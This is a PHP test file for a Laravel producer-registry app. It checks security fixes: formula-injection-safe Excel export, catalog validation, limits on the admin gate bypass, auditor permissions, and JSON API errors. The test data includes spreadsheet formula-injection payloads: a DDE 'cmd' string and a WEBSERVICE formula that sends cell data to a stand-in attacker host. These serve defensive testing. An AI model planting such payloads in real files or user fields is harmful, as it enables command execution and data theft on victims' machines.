<?php

use App\Models\Comercio;
use App\Models\Cultivo;
use App\Models\Propiedad;
use App\Models\StaffUser;
use App\Models\User;
use Illuminate\Auth\Access\AuthorizationException;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Route;
use Laravel\Sanctum\Sanctum;

function remediationExtractXlsxEntry(string $binary, string $entry): ?string
{
    $path = tempnam(sys_get_temp_dir(), 'xlsx');
    file_put_contents($path, $binary);

    $zip = new ZipArchive;
    $zip->open($path);
    $content = $zip->getFromName($entry);
    $zip->close();
    unlink($path);

    return $content === false ? null : $content;
}

// =====================================================================
// A1 — INYECCIÓN DE FÓRMULAS EN EXPORTACIÓN EXCEL
// =====================================================================

test('la exportacion excel escribe valores maliciosos como texto y nunca como formulas', function () {
    $admin = StaffUser::factory()->create(['role' => 'admin']);

    $producer = User::factory()->create([
        'name' => "=cmd|' /C calc'!A0",
    ]);

    $propiedad = Propiedad::factory()->for($producer, 'usuario')->create([
        'calle' => '=WEBSERVICE("http://atacante.evil/?c="&A1)',
        'rut' => true,
        'rut_valor' => '+12345678',
    ]);

    Cultivo::factory()->for($propiedad, 'propiedad')->create([
        'variedad' => '@texto',
        'tipo' => '-Horticola',
    ]);

    $response = $this->actingAs($admin, 'staff')
        ->get(route('staff.producers.export', ['all' => '1']));

    $response->assertOk();
    $response->assertHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

    $sheetXml = remediationExtractXlsxEntry($response->getContent(), 'xl/worksheets/sheet1.xml');
    $sharedStrings = remediationExtractXlsxEntry($response->getContent(), 'xl/sharedStrings.xml');

    expect($sheetXml)->not->toBeNull()
        ->and($sharedStrings)->not->toBeNull()
        ->and($sheetXml)->not->toContain('<f>')
        ->and($sharedStrings)->toContain("=cmd|' /C calc'!A0")
        ->and($sharedStrings)->toContain('=WEBSERVICE')
        ->and($sharedStrings)->toContain('+12345678')
        ->and($sharedStrings)->toContain('@texto')
        ->and($sharedStrings)->toContain('-Horticola');
});

test('comercio rechaza mercados con valores fuera del catalogo', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)->post('/comercios', [
        'infraestructura_empaque' => true,
        'vende_en_finca' => true,
        'tiene_mercados' => true,
        'mercados' => ['=WEBSERVICE("http://atacante.evil")'],
        'cooperativas' => [],
    ]);

    $response->assertSessionHasErrors(['mercados.0']);
});

test('comercio rechaza cooperativas con valores fuera del catalogo al actualizar', function () {
    $user = User::factory()->create();
    $comercio = Comercio::factory()->for($user, 'usuario')->create();

    $response = $this->actingAs($user)->put("/comercios/{$comercio->id}", [
        'infraestructura_empaque' => false,
        'vende_en_finca' => true,
        'cooperativas' => ['+cmd|\' /C calc\'!A0'],
        'mercados' => [],
    ]);

    $response->assertSessionHasErrors(['cooperativas.0']);
});

test('comercio acepta claves y etiquetas del catalogo', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)->post('/comercios', [
        'infraestructura_empaque' => true,
        'vende_en_finca' => true,
        'tiene_mercados' => true,
        'tiene_cooperativas' => true,
        'mercados' => ['mercado_guaymallen'],
        'cooperativas' => ['Coop. Tulumaya'],
    ]);

    $response->assertRedirect('/comercios');

    $this->assertDatabaseHas('comercios', [
        'usuario_id' => $user->id,
        'mercados' => json_encode(['mercado_guaymallen']),
    ]);
});

// =====================================================================
// A2 — GATE::before ACOTADO A ABILITIES STAFF
// =====================================================================

test('el bypass de gate del admin staff solo aplica a abilities staff', function () {
    Gate::define('future-producer-ability', fn ($user) => false);

    $admin = StaffUser::factory()->create(['role' => 'admin']);

    expect(Gate::forUser($admin)->allows('view-dashboard'))->toBeTrue()
        ->and(Gate::forUser($admin)->allows('view-producers'))->toBeTrue()
        ->and(Gate::forUser($admin)->allows('export-producers'))->toBeTrue()
        ->and(Gate::forUser($admin)->allows('manage-staff'))->toBeTrue()
        ->and(Gate::forUser($admin)->allows('future-producer-ability'))->toBeFalse();
});

// =====================================================================
// MATRIZ DE PERMISOS AUDITOR (backend)
// =====================================================================

test('auditor puede ver dashboard listado y detalle de productores', function () {
    $auditor = StaffUser::factory()->create(['role' => 'auditor']);
    $producer = User::factory()->create();
    Propiedad::factory()->for($producer, 'usuario')->create();

    $this->actingAs($auditor, 'staff')
        ->get(route('staff.dashboard'))
        ->assertOk();

    $this->actingAs($auditor, 'staff')
        ->get(route('staff.producers.index'))
        ->assertOk();

    $this->actingAs($auditor, 'staff')
        ->get(route('staff.producers.show', $producer->id))
        ->assertOk();
});

test('auditor puede exportar productores via web porque es funcionalidad intencional', function () {
    $auditor = StaffUser::factory()->create(['role' => 'auditor']);
    User::factory()->count(2)->create();

    $response = $this->actingAs($auditor, 'staff')
        ->get(route('staff.producers.export', ['all' => '1']));

    $response->assertOk();
    $response->assertHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
});

test('auditor no puede crear usuarios staff ni admins ni auditores aunque conozca la url', function () {
    $auditor = StaffUser::factory()->create(['role' => 'auditor']);

    foreach (['auditor', 'admin'] as $role) {
        $response = $this->actingAs($auditor, 'staff')->post(route('staff.users.store'), [
            'name' => 'Intruso',
            'email' => "intruso-{$role}@staff.com",
            'password' => 'password123',
            'password_confirmation' => 'password123',
            'role' => $role,
        ]);

        $response->assertForbidden();
    }

    $this->assertDatabaseMissing('staff_users', ['email' => 'intruso-admin@staff.com']);
    $this->assertDatabaseMissing('staff_users', ['email' => 'intruso-auditor@staff.com']);
});

test('auditor no puede editar ni eliminar usuarios staff aunque manipule la peticion', function () {
    $auditor = StaffUser::factory()->create(['role' => 'auditor']);
    $target = StaffUser::factory()->create();

    $this->actingAs($auditor, 'staff')
        ->get(route('staff.users.edit', $target->id))
        ->assertForbidden();

    $this->actingAs($auditor, 'staff')
        ->patch(route('staff.users.update', $target->id), [
            'name' => 'Editado',
            'email' => 'editado@staff.com',
            'role' => 'admin',
        ])
        ->assertForbidden();

    $this->actingAs($auditor, 'staff')
        ->delete(route('staff.users.destroy', $target->id))
        ->assertForbidden();

    $this->assertDatabaseHas('staff_users', [
        'id' => $target->id,
        'role' => $target->role,
    ]);
    $this->assertNotSoftDeleted($target);
});

test('admin puede gestionar usuarios staff via web', function () {
    $admin = StaffUser::factory()->create(['role' => 'admin']);

    $this->actingAs($admin, 'staff')
        ->post(route('staff.users.store'), [
            'name' => 'Nuevo Admin',
            'email' => 'nuevo-admin@staff.com',
            'password' => 'Password123!',
            'password_confirmation' => 'Password123!',
            'role' => 'admin',
        ])
        ->assertRedirect();

    $this->assertDatabaseHas('staff_users', [
        'email' => 'nuevo-admin@staff.com',
        'role' => 'admin',
    ]);
});

test('auditor no puede ejecutar endpoints administrativos de staff via api', function () {
    $auditor = StaffUser::factory()->create(['role' => 'auditor']);
    $target = StaffUser::factory()->create();
    Sanctum::actingAs($auditor, ['*'], 'staff-api');

    $this->getJson('/api/staff/users/create')
        ->assertForbidden();

    $this->postJson('/api/staff/users', [
        'name' => 'API Intruso',
        'email' => 'api-intruso@staff.com',
        'password' => 'password123',
        'password_confirmation' => 'password123',
        'role' => 'admin',
    ])->assertForbidden();

    $this->getJson('/api/staff/users/'.$target->id.'/edit')
        ->assertForbidden();

    $this->patchJson('/api/staff/users/'.$target->id, ['name' => 'Hacked'])
        ->assertForbidden();

    $this->deleteJson('/api/staff/users/'.$target->id)
        ->assertForbidden();

    $this->assertDatabaseMissing('staff_users', ['email' => 'api-intruso@staff.com']);
    $this->assertNotSoftDeleted($target);
});

// =====================================================================
// A4 — MANEJO DE ERRORES API
// =====================================================================

test('api devuelve 404 json para recurso inexistente en lugar de 500', function () {
    $admin = StaffUser::factory()->create(['role' => 'admin']);
    Sanctum::actingAs($admin, ['*'], 'staff-api');

    $response = $this->getJson('/api/staff/producers/999999');

    $response->assertNotFound()
        ->assertJson(['message' => 'Recurso no encontrado.']);
});

test('api devuelve 403 json cuando la accion no esta autorizada en lugar de 500', function () {
    Route::middleware('auth:staff-api')
        ->get('/_test/authz-denied', fn () => throw new AuthorizationException('denied'));

    $staff = StaffUser::factory()->create(['role' => 'auditor']);
    Sanctum::actingAs($staff, ['*'], 'staff-api');

    $response = $this->getJson('/_test/authz-denied');

    $response->assertForbidden()
        ->assertJson(['message' => 'No autorizado.']);
});
